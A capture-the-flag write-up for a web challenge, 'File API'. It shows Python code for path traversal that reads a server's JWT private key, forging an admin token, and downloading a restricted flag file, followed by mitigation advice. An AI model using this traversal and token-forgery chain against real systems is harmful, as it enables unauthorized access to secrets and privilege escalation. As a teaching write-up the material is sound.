# File API - CTF Challenge Writeup

**Challenge Name:** File API\
**Category:** Web Security\
**Description:** "No source provided. GLHF :)"

## Challenge Overview

The File API challenge presents a REST API with JWT-based authentication and file download functionality. The goal is to access a restricted `flag.txt` file that requires elevated privileges.

## Initial Reconnaissance

### API Endpoints Discovery

Accessing the challenge URL reveals several key endpoints:

![Screenshot](./Images/OpenAPI%20UI.png)

- `GET /` - Root endpoint
- `GET /docs` - Swagger UI documentation
- `GET /openapi.json` - OpenAPI specification
- `POST /api/register` - User registration
- `POST /api/login` - User authentication
- `GET /api/me` - Current user information
- `GET /api/files` - List available files
- `GET /api/download?file=<filename>` - Download files (requires authentication)

### API Analysis

The OpenAPI specification reveals:

- JWT-based authentication using Bearer tokens
- File download functionality with a `file` parameter
- Security schemes using HTTPBearer

## Exploitation Process

### Step 1: Authentication and File Enumeration

First, I created a user account and authenticated to obtain a JWT token:

```python
import requests
import uuid

BASE = "https://xwivtpjs.web.ctf.uscybergames.com"
s = requests.Session()

# Register and login
username = f"ctf_{uuid.uuid4().hex[:8]}"
password = uuid.uuid4().hex

s.post(f"{BASE}/api/register", json={"username": username, "password": password})
r = s.post(f"{BASE}/api/login", json={"username": username, "password": password})
token = r.json()["access_token"]
s.headers["Authorization"] = f"Bearer {token}"
```

### Step 2: JWT Token Analysis

Examining the JWT token from `/api/me` revealed crucial information:

```json
{
  "sub": "ctf_b1ac62e6",
  "role": "user", 
  "kid": "/app/secrets/jwtRS256.key"
}
```

**Key Observations:**

- Current role is `user` (likely need `admin` for flag access)
- `kid` parameter exposes the JWT signing key location: `/app/secrets/jwtRS256.key`

### Step 3: File Discovery

The `/api/files` endpoint revealed three files:

- `flag.txt` (25 bytes, **restricted**: true) ← Target file
- `readme.txt` (20 bytes, restricted: false)
- `swagger.json` (6498 bytes, restricted: false)

Attempting to download `flag.txt` returned `403 Forbidden`, confirming insufficient privileges.

### Step 4: Path Traversal Attack

The `kid` parameter suggested the JWT signing key might be accessible. I tested path traversal on the `/api/download` endpoint:

```python
# Attempt to access the JWT signing key
r = s.get(f"{BASE}/api/download", params={"file": "../app/secrets/jwtRS256.key"})
```

**Success!** The path traversal vulnerability allowed access to the private key:

```
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCs+xUhk5MlLAs6
SdZ7aH4WH91qguB7ryhvrqeLwHUgr7AOv/Jn5vuBlo40+0kgqRK0BMoW5mo4fCDR
[... key content ...]
-----END PRIVATE KEY-----
```

### Step 5: JWT Forgery and Privilege Escalation

With the private key, I could forge a new JWT token with admin privileges:

```python
import jwt

private_key = """-----BEGIN PRIVATE KEY-----
[... extracted key ...]
-----END PRIVATE KEY-----"""

# Forge admin token
admin_payload = {
    "sub": "ctf_b1ac62e6",
    "role": "admin",  # Escalate privileges
    "kid": "/app/secrets/jwtRS256.key"
}

admin_token = jwt.encode(admin_payload, private_key, algorithm="RS256")
s.headers["Authorization"] = f"Bearer {admin_token}"
```

### Step 6: Flag Retrieval

With the forged admin token, I could successfully access the restricted flag file:

```python
r = s.get(f"{BASE}/api/download", params={"file": "flag.txt"})
flag = r.content.decode('utf-8')
print(f"FLAG: {flag}")
```

## Vulnerability Chain

This challenge demonstrated a chain of vulnerabilities:

1. **Information Disclosure**: JWT `kid` parameter exposed private key location
1. **Path Traversal**: `/api/download` endpoint allowed directory traversal (`../`)
1. **Cryptographic Key Exposure**: Private key was accessible through path traversal
1. **Insufficient Access Controls**: Role-based access could be bypassed with forged tokens

## Complete Exploit Code

```python
import requests
import jwt
import uuid

BASE = "https://xwivtpjs.web.ctf.uscybergames.com"
TIMEOUT = 10

# Extracted private key
private_key = """-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCs+xUhk5MlLAs6
[... full key content ...]
-----END PRIVATE KEY-----"""

s = requests.Session()
s.headers.update({"User-Agent": "file-api-client"})

# Create admin JWT payload
admin_payload = {
    "sub": "ctf_b1ac62e6",
    "role": "admin",
    "kid": "/app/secrets/jwtRS256.key"
}

# Forge admin token
admin_token = jwt.encode(admin_payload, private_key, algorithm="RS256")
s.headers["Authorization"] = f"Bearer {admin_token}"

# Download flag
r = s.get(f"{BASE}/api/download", params={"file": "flag.txt"}, timeout=TIMEOUT)
flag = r.content.decode('utf-8', 'ignore')
print(f"FLAG: {flag}")
```

## Lessons Learned

1. **Never expose sensitive paths in JWT claims** - The `kid` parameter should not reveal filesystem paths
1. **Implement proper path validation** - File download endpoints must prevent directory traversal
1. **Secure key storage** - Private keys should never be accessible via web endpoints
1. **Defense in depth** - Multiple security layers prevent single-point-of-failure exploits

## Mitigation Strategies

- **Input Validation**: Sanitize file paths and reject `../` sequences
- **Allowlisting**: Only permit downloads from designated directories
- **Key Management**: Store private keys outside web-accessible paths
- **JWT Security**: Use key IDs that don't expose internal paths
- **Access Controls**: Implement robust authorization checks that can't be bypassed

This challenge excellently demonstrated how seemingly minor information leaks can lead to complete system compromise through vulnerability chaining.
